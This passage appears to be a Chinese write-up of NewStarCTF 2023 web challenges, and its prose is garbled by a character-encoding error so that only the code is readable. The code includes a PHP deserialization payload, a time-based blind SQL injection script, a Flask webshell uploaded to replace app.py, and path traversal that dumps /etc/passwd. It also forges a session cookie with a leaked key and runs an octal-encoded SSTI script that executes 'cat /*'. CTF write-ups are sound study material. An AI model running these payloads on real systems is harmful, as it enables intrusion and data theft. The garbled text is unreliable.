2.ä¸»åŠ¨è°ƒç”¨$obj = NULL 3.ç¨‹åºè‡ªåŠ¨ç»“æŸ é™¤æ­¤ä¹‹å¤–ï¼ŒPHPè¿˜æ‹¥æœ‰åƒåœ¾å›æ”¶Garbage collectionå³æˆ‘ä»¬å¸¸è¯´çš„GCæœºåˆ¶ã€‚ PHPä¸­GCä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸè‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å½“æˆ‘ä»¬çš„å¯¹è±¡å˜æˆäº†â€œåƒåœ¾â€ï¼Œå°±ä¼šè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ï¼Œå›æ”¶è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•°çš„__destructã€‚ åˆšæ‰æˆ‘ä»¬æåˆ°äº†å¼•ç”¨è®¡æ•°ï¼Œå…¶å®å½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰ä»»ä½•å¼•ç”¨çš„æ—¶å€™ï¼Œåˆ™ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€ï¼Œå³ $a = new test(); test å¯¹è±¡è¢« å˜é‡ a å¼•ç”¨ï¼Œ æ‰€ä»¥è¯¥å¯¹è±¡ä¸æ˜¯â€œåƒåœ¾â€ï¼Œè€Œå¦‚æœæ˜¯è¿™æ · new test(); æˆ–è¿™æ · $a = new test(); $a = 1; è¿™æ ·åœ¨ test åœ¨æ²¡æœ‰è¢«å¼•ç”¨æˆ–åœ¨å¤±å»å¼•ç”¨æ—¶ä¾¿ä¼šè¢«å½“ä½œâ€œåƒåœ¾â€è¿›è¡Œå›æ”¶ å¦‚ï¼š &lt;?php class test{ function __construct($i) {$this-&gt;i = $i; } function __destruct() { echo $this-&gt;i.\"Destroy... \"; } } new test('1'); $a = new test('2'); $a = new test('3'); echo \"â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”&lt;br/&gt;\"; è¾“å‡º 1Destroy... 2Destroy... â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” 3Destroy... è¿™é‡Œæ˜¯å½“aç¬¬äºŒæ¬¡èµ‹å€¼æ—¶,test('2')å¤±å»å¼•ç”¨ï¼Œæ‰§è¡Œ__destruct,ç„¶åæ‰§è¡Œecho,å½“ç¨‹åºå®Œäº†åtest('3')é”€æ¯ï¼Œæ‰§è¡Œå®ƒçš„__destruct ä¸¾ä¸ªæ —å­ï¼š &lt;?php class test { function __destruct() { echo 'success!!'; } } if(isset($_REQUEST['input'])) { $a = unserialize($_REQUEST['input']); throw new Exception('lose'); } è¿™é‡Œæˆ‘ä»¬è¦æ±‚è¾“å‡º success!! ï¼Œä½†æ‰§è¡Œååºåˆ—åŒ–åå¾—åˆ°çš„å¯¹è±¡æœ‰äº†å¼•ç”¨ï¼Œç»™äº† a å˜é‡ï¼Œåé¢ç¨‹åºæ¥ç€å°±æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œéæ­£å¸¸ç»“æŸï¼Œå¯¼è‡´æœªæ­£å¸¸å®Œæˆ GC æœºåˆ¶ï¼Œå³æ²¡æœ‰æ‰§è¡Œ __destruct ã€‚ ç›´æ¥æ„é€ ååºåˆ—åŒ– test ç±»å¾—åˆ°ï¼ˆè¿™é‡Œéƒ½æ˜¯å€Ÿç”¨çš„æ–‡ç« ä¾‹å­ ![image-20231106212531886](NewStarCTF 2023/image-20231106212531886.png) æ‰€ä»¥æˆ‘ä»¬è¦ååºåˆ—åŒ–æ‰‹åŠ¨å» â€œé”€æ¯â€ åˆ›é€ çš„å¯¹è±¡ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„æ¥å®Œæˆã€‚æ„é€  class test {} $a = serialize(array(new test, null)); echo $a.'&lt;br/&gt;'; $a = str_replace(':1', ':0', $a);//å°†åºåˆ—åŒ–çš„æ•°ç»„ä¸‹æ ‡ä¸º0çš„å…ƒç´ ç»™ä¸ºnull echo $a; å¾—åˆ° a:2:{i:0;O:4:\"test\":0:{}i:1;N;} a:2:{i:0;O:4:\"test\":0:{}i:0;N;}//æœ€ç»ˆpayload ä¼ å…¥ï¼ŒæˆåŠŸå¾—åˆ° success!! ![image-20231106212541970](NewStarCTF 2023/image-20231106212541970.png) æˆ‘ä»¬åºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„å¯¹è±¡ï¼Œè€ƒè™‘ååºåˆ—åŒ–æœ¬å­—ç¬¦ä¸²ï¼Œå› ä¸ºååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†Array[0]è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†Array[0]è®¾ç½®ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„testå¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ__destructäº†ã€‚ è‡³äºå…·ä½“çš„GCæœºåˆ¶åŸç†ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸æƒ³æ·±ç©¶äº†ï¼ˆå› ä¸ºæ‡’ï¼Œå¦‚æœæ—¥åæœ‰ç¼˜åœ¨å­¦ä¹ å§ï¼Œä¸è¿‡ç›¸å…³åŸç†æ–‡ç« æˆ‘ä¼šé™„åœ¨ä¸‹é¢çš„ WEEK4|WEB-More Fast-midsql è¿™é‡Œæ˜¯sqlæ³¨å…¥ï¼Œç®€å•æµ‹è¯•å‡ ç•ªï¼Œç»“æœå®è·µèƒ½åŠ›å·®çš„æˆ‘ï¼Œæ²¡æµ‹å‡ºæ¥è¿‡æ»¤äº†ä»€ä¹ˆå°±çœ‹wpäº†ï¼Œç»“æœåªæ˜¯è¿‡æ»¤äº†ä¸ªç©ºæ ¼ï¼Œçœ‹æ¥ä»¥åå¾—è®¤çœŸå­¦å­¦å¦‚ä½•æ‰‹åŠ¨fuzzå¤„å¤§æ¦‚è¿‡æ»¤çš„ä¸œè¥¿ã€‚è¿™é‡Œç¡®å®šæ˜¯ç©ºæ ¼ä¹‹åï¼Œå°è¯•æŠ¥é”™ï¼Œè”åˆç­‰ç­‰æ³¨å…¥å‡æ— æœï¼Œé¡µé¢è¿”å›ç»“æœä¸€è‡´ï¼Œäºæ˜¯å°è¯•æ—¶é—´ç›²æ³¨ ?id=1/**/and/**/if(2&gt;1,sleep(5),1) ?id=1/**/and/**/if(1&gt;1,sleep(5),1) ç»è¿‡ä¸Šè¿°payloadçš„æµ‹è¯•ï¼Œå‘ç°é¡µé¢æœ‰æ˜æ˜¾çš„æ—¶é—´å»¶è¿Ÿçš„ç°è±¡ï¼Œé‚£è‚¯å®šå°±æ˜¯æ—¶é—´ç›²æ³¨äº†ï¼Œè‚¯å®šå°±å¾—å†™è„šæœ¬äº†ï¼ˆåˆæ˜¯è„šæœ¬â”­â”®ï¹â”­â”®ï¼ŒçœŸå¿ƒä¸ä¼šå†™å•Šï¼‰ä¸‹å»å¾—è¿›ä¿®ä¸€ä¸‹pythonä»£ç äº† è¿™é‡Œå…ˆæ„é€ ä¸€æ¡payloadï¼š ?id=1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)from(information_schema.schemata)),{i},1))&gt;{mid},sleep(5),1) éšåç¼–å†™è„šæœ¬ è¿™é‡Œçš„è„šæœ¬ä¹Ÿæ˜¯ä¸çŸ¥é“å’‹ä¼˜åŒ–ï¼Œä½†æ˜¯çœ‹å®˜æ–¹çš„åˆæ„Ÿè§‰æœ‰ç‚¹å¤æ‚ã€‚ã€‚ã€‚ import time import requests url = 'http://f6337ab6-ed3c-472d-835f-3b756a55dd5d.node4.buuoj.cn:81/?id=' database_name = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = url + f\"1/**/and/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{i},1))&gt;{mid},sleep(2),0)#\" start_time = time.time() response = requests.get(payload).text end_time = time.time() use_time = end_time - start_time if use_time &gt; 2: left = mid + 1 else: right = mid mid = (left + right) // 2 print(mid) database_name += chr(mid) print(database_name) ä½†æ˜¯å‡ºæ¥çš„ç»“æœæ€»æ˜¯æœ‰åƒåœ¾å­—ç¬¦ï¼Œå¤´ç–¼ã€‚ã€‚ã€‚ â€‹ WEEK4|WEB-flask disk è¿™é“é¢˜ç›®ä¹Ÿæ˜¯ä¹‹å‰oxgameåˆ·åˆ°è¿‡ï¼Œä¹Ÿæ˜¯å…³äºPINç ï¼Œæˆ‘ä»¥ä¸ºä¸é‚£ä¸ªç±»ä¼¼ç‚¹ï¼Œä½†è¿˜æ˜¯æœ‰æ‰€åŒºåˆ«ï¼Œä¸è¿‡è¿™åœ¨æš—ç¤ºæˆ‘å¾—å­¦ä¹ ä¸€æ³¢flaskçš„PINç äº† ![image-20231107201543598](NewStarCTF 2023/image-20231107201543598.png) è¿™é‡Œé¢˜ç›®ç»™äº†ä¸‰ä¸ªé“¾æ¥ï¼Œä¸€ä¸ªæ˜¯ä¼šæ˜¾ç¤ºä¸Šä¼ çš„æ–‡ä»¶æ—¶é—´ç­‰ä¿¡æ¯å•¥çš„ï¼Œä¸è¿‡æœ€å¼€å§‹å¼€æ˜¾ç¤ºç€app.pyï¼Œç„¶åuploadæ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼Œä¸è¿‡æ²¡å•¥è¿‡æ»¤ ![image-20231107201642236](NewStarCTF 2023/image-20231107201642236.png) è€Œæœ€åä¸€ä¸ªæ˜¯ä¸€ä¸ªè®©å†™PINç çš„é¡µé¢ï¼Œè¿™é‡Œåªè¦å­¦è¿‡ç›¸å…³çŸ¥è¯†å¯ä»¥çŸ¥é“æ­¤æ—¶è‚¯å®šæ˜¯å¼€å¯äº†debugæ¨¡å¼çš„ï¼Œä¸è¿‡æˆ‘ä¹Ÿå°±åªèƒ½æƒ³åˆ°è¿™é‡Œï¼ˆåœ¨æ²¡å­¦ä¹‹å‰ï¼‰äºæ˜¯çœ‹äº†çœ‹wpï¼š è®¿é—®admin manageå‘ç°è¦è¾“å…¥pinç ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ã€‚flaskå¼€å¯äº†debugæ¨¡å¼ä¸‹ï¼Œapp.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ã€‚æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†ã€‚æ³¨æ„è¯­æ³•ä¸èƒ½å‡ºé”™ï¼Œå¦åˆ™ä¼šå´©æºƒã€‚ ä¹Ÿæ˜¯å¾ˆæƒŠè®¶ï¼Œç«Ÿç„¶å¯ä»¥è¿™æ ·ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å†™ä¸€ä¸ªpyï¼Œåœ¨uploadä¸Šä¼ å³å¯ from flask import Flask, request import os app = Flask(__name__) @app.route('/') def index(): try: cmd = request.args.get('cmd')#Python pass æ˜¯ç©ºè¯­å¥ï¼Œæ˜¯ä¸ºäº†ä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§ã€‚pass ä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥ã€‚ data = os.popen(cmd).read() return data except: pass return \"1\" if __name__ = '__main__': app.run(host='0.0.0.0', port=5000, debug=True) æ¯”å¦‚ä¸Šè¿°pyå°±æ³¨æ„éœ€è¦å¯¼å…¥å¿…è¦çš„flaskï¼Œapp.runç­‰ç­‰ ![image-20231107203516994](NewStarCTF 2023/image-20231107203516994.png) è¿™é‡Œä¹Ÿæ˜¯è¸©äº†ä¸ªå°å‘ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸€å®šè¦æ˜¯app.pyä¸ç„¶è¦†ç›–ä¸äº†ã€‚ã€‚ã€‚ã€‚ã€‚ä¸‹é¢é™„ä¸€ä¸ªé¢˜ç›®æºç ï¼š from flask import Flask,request,send_file import os,datetime app = Flask(__name__) @app.route('/',methods=['GET']) def index(): return '&lt;h1&gt;Welcome to my flask disk&lt;/h1&gt;&lt;a href=\"/list\"&gt;list files&lt;/a&gt;&lt;br&gt;&lt;a href=\"/upload\"&gt;upload files&lt;/a&gt;&lt;br&gt;&lt;a href=\"/console\"&gt;admin manage&lt;/a&gt;' @app.route('/list',methods=['GET']) def list(): dirs = os.listdir('.')#è¿”å›æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ã€‚è¿™é‡Œåº”è¯¥å°±æ˜¯å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ items = '' for dir in dirs: if os.path.isfile(dir):#åˆ¤æ–­è·¯å¾„æ˜¯å¦ä¸ºæ–‡ä»¶ create_time = int(os.path.getctime(dir))#è¿”å›æ–‡ä»¶ path åˆ›å»ºæ—¶é—´ create_time = datetime.datetime.fromtimestamp(create_time)#è¿™é‡Œæ˜¯å¯¹create_timeè¿™ä¸ªæ—¶é—´æˆ³è½¬æ¢ä¸ºæ­£å¸¸æ—¥æœŸ #ä¸‹é¢æ˜¯è¿”å›æ–‡ä»¶å¤§å°ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨å°±è¿”å›é”™è¯¯ item =f'&lt;/pre&gt;{dir} {str(os.path.getsize(dir))}b {create_time}&lt;/pre&gt;&lt;br&gt;&lt;br&gt;' items += item items += ' ' return items @app.route('/upload',methods=['GET','POST']) def upload(): if request.method == 'GET': s='&lt;form action=\"/upload\" method=\"POST\" enctype=\"multipart/form-data\"&gt;&lt;input type=\"file\" name=\"file\"&gt;&lt;input type=\"submit\" value=\"Upload\"&gt;&lt;/form&gt;' return s elif request.method == 'POST': file = request.files['file']#postä¸Šä¼ æ–‡ä»¶file if '..' in file.filename or '/' in file.filename:#é˜²æ­¢ç›®å½•ç©¿è¶Š return '.. and / are not allowed!' file.save(file.filename)#ä¿å­˜ä¸Šä¼ çš„æ–‡ä»¶ return 'upload success. &lt;a href=\"/list\"&gt;check&lt;/a&gt;' @app.route('/download',methods=['GET','POST']) def download(): filename = request.args.get('filename')#æ¥å—filenameçš„getä¼ å‚ if filename and os.path.exists(filename):#åˆ¤æ–­filenameå‚æ•°æ˜¯å¦å­˜åœ¨ï¼Œä¸”å¯¹åº”çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if '..' in filename or '/' in filename:#é˜²æ­¢ç›®å½•ç©¿è¶Š return '.. and / are not allowed!' return send_file(filename,as_attachment=True)#as_attachmentç¡®ä¿filenameå¯¹åº”çš„æ–‡ä»¶å¯ä»¥æ­£å¸¸çš„è¢«ä¸‹è½½åˆ° else: return 'no file to download or file not exist' if __name__=='__main__': app.run(host='0.0.0.0',debug=True,port=5000) è‡³äºPINç çš„å­¦ä¹ ï¼Œä¹‹åå¦å¼€ä¸€ç¯‡æ–‡ç«  WEEK4|WEB-InjectMe ![image-20231107213238881](NewStarCTF 2023/image-20231107213238881.png) é¦–é¡µæç¤ºæˆ‘ä»¬å›¾ç‰‡ä¼¼ä¹æœ‰ç§˜å¯†ï¼Œè¿™é‡Œç›´æ¥ç‚¹å‡»è¿›å»çœ‹åˆ°äº†æœ‰å¾ˆå¤šæ–‡ä»¶æˆ–è€…å›¾åƒå¯ä»¥è¯»å–ï¼Œçœ‹äº†ä¸€é€šå‘ç° ![image-20231107213326629](NewStarCTF 2023/image-20231107213326629.png) é™¤äº†ä¸Šå›¾çš„dsæ–‡ä»¶ï¼Œå°±åªæœ‰ä¸‹é¢è¿™ä¸ªæœ‰äº›è®¸æºç çš„å›¾äº†ï¼Œè¿™é‡Œåªæ”¾äº†downloadè·¯ç”±çš„å®ç°æ–¹æ³• ![image-20231107212741290](NewStarCTF 2023/image-20231107212741290.png) è¿™é‡Œåˆ†æå‘ç°ï¼Œä¼šæ¥å—ä¸€ä¸ªfileçš„getä¼ å‚ï¼Œä¹‹åå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œâ€¦/çš„è¿‡æ»¤ï¼Œä½†è¿™é‡Œåªæ›¿æ¢äº†ä¸€æ¬¡ã€‚æ˜æ˜¾å¯ä»¥åŒå†™ç»•è¿‡ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è¯»å–å¦‚ä¸‹æ–‡ä»¶ ?file=....//....//....//....//....//etc/passwd ?file=....//....//....//....//....//app/app.py root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin è¿™é‡Œç¬¬äºŒä¸ªè·¯å¾„é çš„æ˜¯é¢˜ç›®ç»™çš„é™„ä»¶æ‰å‡ºæ¥çš„ ![image-20231107213918683](NewStarCTF 2023/image-20231107213918683.png) import os import re from flask import Flask, render_template, request, abort, send_file, session, render_template_string from config import secret_key app = Flask(__name__) app.secret_key = secret_key#æœ‰sessionä¼ªé€ çš„æ„Ÿè§‰äº† @app.route('/') def hello_world(): # put application's code here return render_template('index.html') @app.route(\"/cancanneed\", methods=[\"GET\"]) def cancanneed(): #os.listdir() æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ all_filename = os.listdir('./static/img/') filename = request.args.get('file', '') if filename: return render_template('img.html', filename=filename, all_filename=all_filename) else: return f\"{str(os.listdir('./static/img/'))} &lt;br&gt; &lt;a href=\\\"/cancanneed?file=1.jpg\\\"&gt;/cancanneed?file=1.jpg&lt;/a&gt;\" @app.route(\"/download\", methods=[\"GET\"]) def download(): filename = request.args.get('file', '') if filename: filename = filename.replace('../', '') filename = os.path.join('static/img/', filename) print(filename) if (os.path.exists(filename)) and (\"start\" not in filename): return send_file(filename) else: abort(500) else: abort(404) @app.route('/backdoor', methods=[\"GET\"]) def backdoor(): try: print(session.get(\"user\")) if session.get(\"user\") is None: session['user'] = \"guest\" name = session.get(\"user\") if re.findall( r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.', name): abort(500) else: return render_template_string( 'ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name) except Exception: abort(500) @app.errorhandler(404) def page_not_find(e): return render_template('404.html'), 404 @app.errorhandler(500) def internal_server_error(e): return render_template('500.html'), 500 if __name__ == '__main__': app.run('0.0.0.0', port=8080) @app.route('/backdoor', methods=[\"GET\"]) def backdoor(): try: print(session.get(\"user\")) if session.get(\"user\") is None: session['user'] = \"guest\" name = session.get(\"user\") if re.findall( r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.', name): abort(500) else: return render_template_string( 'ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name) é‡ç‚¹å°±æ˜¯backdooræ–¹æ³•äº†ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯sstiæ³¨å…¥äº†ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦ä¼ªé€ session.useræ‰å¯ã€‚è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†wpæ‰çŸ¥é“è¯»å–keyçš„è·¯å¾„ï¼š?file=....//....//....//....//....//app/config.pyâ€“è¿™é‡Œä¹Ÿæ˜¯æœäº†ï¼Œå®˜æ–¹ç»™çš„è·¯å¾„æ˜¯é”™çš„ï¼Œå¹¸äºæˆ‘çŒœå‡ºæ¥äº†ã€‚ã€‚ã€‚ secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\" æˆ‘ä»¬ç›´æ¥ç”¨å·¥å…·åŠ å¯†è§£å¯†å³å¯ï¼š sessionä¸ºï¼šeyJ1c2VyIjoiZ3Vlc3QifQ.ZUpCog.NWnPbXDYRZQLpWa_xO2dwRwnxmY keyä¸ºï¼šy0u_n3ver_k0nw_s3cret_key_1s_newst4r python3 flask_session_cookie_manager3.py decode -s \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\" -c \"eyJ1c2VyIjoiZ3Vlc3QifQ.ZUpCog.NWnPbXDYRZQLpWa_xO2dwRwnxmY\" è¿™é‡Œä¹Ÿæ˜¯é‡åˆ°ä¸ªå‘ï¼Œä¸çŸ¥ä¸ºä½•ï¼Œ-s å’Œ -céƒ½å¿…é¡»åŒå¼•å·åŒ…å›´ï¼Œå•å¼•å·åŒ…å›´ä¸€ç›´æŠ¥é”™ï¼Œä¸æ¸…æ¥šä¸ºä½•ã€‚ã€‚ã€‚ ![image-20231107220643922](NewStarCTF 2023/image-20231107220643922.png) å¦‚å›¾æˆåŠŸçœ‹åˆ°è§£å¯†ç»“æœï¼Œæ¥ä¸‹æ¥å°±æ˜¯åŠ å¯†äº†ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰åº”è¯¥æƒ³å¥½å¦‚ä½•pass sstiï¼Œçœ‹ä¸Šè¿°ä»£ç å‘ç°å…³é”®è¯è¿‡æ»¤äº†å¾ˆå¤šï¼Œå¹¶ä¸”ç¼–ç å‘¢ä¹Ÿè¿‡æ»¤äº†base64ï¼Œunicodeã€‚åå…­è¿›åˆ¶ã€‚é‚£æˆ‘ä»¬å…«è¿›åˆ¶ç»•è¿‡å³å¯ï¼Œæ€è·¯æ¸…æ™°äº†ï¼Œä½†æ˜¯æ‰‹å·¥çš„è¯å¤ªè´¹åŠ²ï¼Œä¸€çœ‹å®˜æ–¹wpï¼Œåˆæ˜¯è„šæœ¬â”­â”®ï¹â”­â”®ã€‚å”‰ï¼Œè¿˜æ˜¯å¾—è‰°éš¾çš„å•ƒä¸€å•ƒï¼š import re #æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… import requests import subprocess #ç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤ # æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py # https://github.com/noraj/flask-session-cookie-manager def string_to_octal_ascii(s): octal_ascii = \"\" for char in s: char_code = ord(char) #è½¬æ¢ä¸ºASCIIç  #03o å‚æ•°å‘Šè¯‰ format å‡½æ•°å°† char_code è½¬æ¢ä¸ºå…«è¿›åˆ¶ï¼Œç„¶åç¡®ä¿è‡³å°‘å 3ä½å®½ï¼Œä¸è¶³çš„åœ°æ–¹ç”¨é›¶å¡«å……ã€‚ #è¿™é‡Œå››ä¸ªåæ–œæ æ˜¯ä¸ºäº†è½¬ä¹‰æœ€ç»ˆæˆåŠŸä¸¤ä¸ªåæ–œæ , octal_ascii += \"\\\\\\\\\" + format(char_code, '03o') # octal_ascii += \"\\\\\\\\\" + format(char_code, 'o') #print(octal_ascii) return octal_ascii secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\" # payload = \"{%print(7*7)%}\" # payload = \"{%print(\\\"\\\"\\\\\\\\u005f\\\\\\\\u005f\\\"\\\")%}\" # payload = \"{%print(\\\"\\\"\\\\\\\\x5f\\\\\\\\x5f\\\"\\\")%}\" eval_shell = \"\\\"\\\"\" + string_to_octal_ascii(\"__import__(\\\"os\\\").popen(\\\"cat /*\\\").read()\") + \"\\\"\\\"\" print(eval_shell) # dockeréƒ¨ç½²&amp;windowsè¿è¡Œpayload # {{x.__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"dir\").read()')}} payload = \"{{%print(xxx|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\\"\\\")({0}))%}}\".format(eval_shell) #print(payload) command = \"python3 flask_session_cookie_manager3.py encode -s \\\"{0}\\\" -t \\\"{{'user':'{1}'}}\\\"\".format(secret_key, payload) print(command) session_data = subprocess.check_output(command, shell=True) #é€šè¿‡æ“ä½œç³»ç»Ÿçš„shellæ‰§è¡ŒæŒ‡å®šå‘½ä»¤,è¿™é‡Œå‘¢å°±æ˜¯sessionä¼ªé€ äº† print(session_data) # linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚ # è¿™é‡Œæ˜¯ç”±äºä¸Šè¿°subprocesså‡½æ•°æ˜¯ä»¥å­—èŠ‚æµè¿”å›ç»“æœçš„,é‚£å¦‚æœå…¶ä¸­æœ‰æ¢è¡Œç¬¦çš„è¯,æˆ‘ä»¬å°±éœ€è¦å»æ‰äº† session_data = session_data[:-2].decode('utf-8')# å°†å­—èŠ‚æµç»“æœä»¥utf-8ç¼–ç çš„æ–¹å¼è§£ç  # session_data = session_data[:-1].decode('utf-8') print(session_data) url = \"http://5c5893f4-8c26-4236-9534-e1da7bebc239.node4.buuoj.cn:81/backdoor\" cookies = {\"session\": session_data} res = requests.get(url=url, cookies=cookies) # print(res.text) pattern = r'&lt;h1&gt;(.*)&lt;/h1&gt;' result_content = re.search(pattern, res.text, re.S) # print(result_content) if result_content: result = result_content.group(1) print(result) else: print(\"something wrong!\") ![image-20231107221951803](NewStarCTF 2023/image-20231107221951803.png) æˆåŠŸæ‹¿åˆ°flagï¼Œæ¥ä¸‹æ¥å°±æ˜¯çœ‹æ‡‚è„šæœ¬å¹¶å°è¯•ç¼–å†™äº†ã€‚ã€‚ã€‚ã€‚ WEEK4|WEB-PharOne ![image-20231108205750064](NewStarCTF 2023/image-20231108205750064.png) è®¿é—®é¦–é¡µçœ‹åˆ°æ˜¯æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œå…ˆä¹ æƒ¯æ€§çš„çœ‹ä¸€ä¸‹æºä»£ç  ![image-20231108205812922](NewStarCTF 2023/image-20231108205812922.png) å‘ç°å¯ä»¥è®¿é—®class.php &lt;?php highlight_file(__FILE__); class Flag{ public $cmd; public function __destruct() { @exec($this-&gt;cmd); } } @unlink($_POST['file']); 